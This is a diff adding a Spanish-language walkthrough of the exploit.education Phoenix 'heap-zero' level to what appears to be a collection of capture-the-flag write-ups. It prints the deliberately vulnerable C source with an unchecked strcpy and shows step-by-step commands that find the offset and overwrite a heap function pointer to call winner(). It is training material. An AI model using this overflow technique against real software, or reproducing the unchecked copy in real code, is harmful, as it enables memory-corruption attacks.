@@ -1125,7 +1125,129 @@ Well done, you're redirected code execution!
 
 ## Heap Zero
 
+```c
+/*
+ * phoenix/heap-zero, by https://exploit.education
+ *
+ * Can you hijack flow control, and execute the winner function?
+ *
+ * Why do C programmers make good Buddhists?
+ * Because they're not object orientated.
+ */
+
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+struct data {
+  char name[64];
+};
+
+struct fp {
+  void (*fp)();
+  char __pad[64 - sizeof(unsigned long)];
+};
+
+void winner() {
+  printf("Congratulations, you have passed this level\n");
+}
+
+void nowinner() {
+  printf(
+      "level has not been passed - function pointer has not been "
+      "overwritten\n");
+}
+
+int main(int argc, char **argv) {
+  struct data *d;
+  struct fp *f;
+
+  printf("%s\n", BANNER);
+
+  if (argc < 2) {
+    printf("Please specify an argument to copy :-)\n");
+    exit(1);
+  }
+
+  d = malloc(sizeof(struct data));
+  f = malloc(sizeof(struct fp));
+  f->fp = nowinner;
+
+  strcpy(d->name, argv[1]);
+
+  printf("data is at %p, fp is at %p, will be calling %p\n", d, f, f->fp);
+  fflush(stdout);
+
+  f->fp();
+
+  return 0;
+}
+```
+
+Debemos llegar a la funcion winner. Así que primero obtenemos la direccion de la funcion en el binario.
+
+```bash
+user@phoenix-amd64:/opt/phoenix/i486$ objdump -t ./heap-zero | grep winner
+0804884e g     F .text	00000019 nowinner
+08048835 g     F .text	00000019 winner #Esta es la ruta que nos importa
+```
+
+Ahora ejecutamos el binario para ver como funciona.
+
+```bash
+user@phoenix-amd64:/opt/phoenix/i486$ ./heap-zero hola
+Welcome to phoenix/heap-zero, brought to you by https://exploit.education
+data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x804884e
+level has not been passed - function pointer has not been overwritte
+```
+
+Ahora intentaremos desbordar con muchas **A**. Y veremos si cambia en algo el comportamiento del programa.
+
+```bash
+user@phoenix-amd64:/opt/phoenix/i486$ ./heap-zero $(python -c "print 'A'*200")
+Welcome to phoenix/heap-zero, brought to you by https://exploit.education
+data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x41414141
+Segmentation fault
+```
+
+Ahora, intentaremos descubir cuantas **A** debemos escribir para empezar a sobrescribir esa direccion de memoria que en el anterior escribimos con 41.
+
+```bash
+user@phoenix-amd64:/opt/phoenix/i486$ ./heap-zero $(python -c "print 'A'*73")
+Welcome to phoenix/heap-zero, brought to you by https://exploit.education
+data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x8040041
+Segmentation fault
+```
+
+Como podemos ver el **A** numero 73, ya esta escribiendo en el registro, entonces lo que haremos será  agregar 4 **B** luego de las 72 **A**.
+
+```bash
+user@phoenix-amd64:/opt/phoenix/i486$ ./heap-zero $(python -c "print 'A'*72+'B'*4")
+Welcome to phoenix/heap-zero, brought to you by https://exploit.education
+data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x42424242
+Segmentation fault
+```
+
+Como podemos ver, si funciona, así que lo que haremos ahora será escribir el valor de **08048835** en donde están los **42424242**.
+
+```bash
+user@phoenix-amd64:/opt/phoenix/i486$ ./heap-zero $(python -c "print 'A'*72+'\x08\x04\x88\x35'[::-1]")
+Welcome to phoenix/heap-zero, brought to you by https://exploit.education
+data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x8048835
+Congratulations, you have passed this level
+```
+
+**NOTA: No podemos usar los del nivel amd64, porque estos cuenta con una direccion de memoria para la funcion winner que posee un caracter malo el cual es 0a, que no nos permite sobrescribir el resto de hexademicales.**
+
 ## Heap One
+
+
+
 ## Heap Two
 ## Heap Three
 # Net Overflow
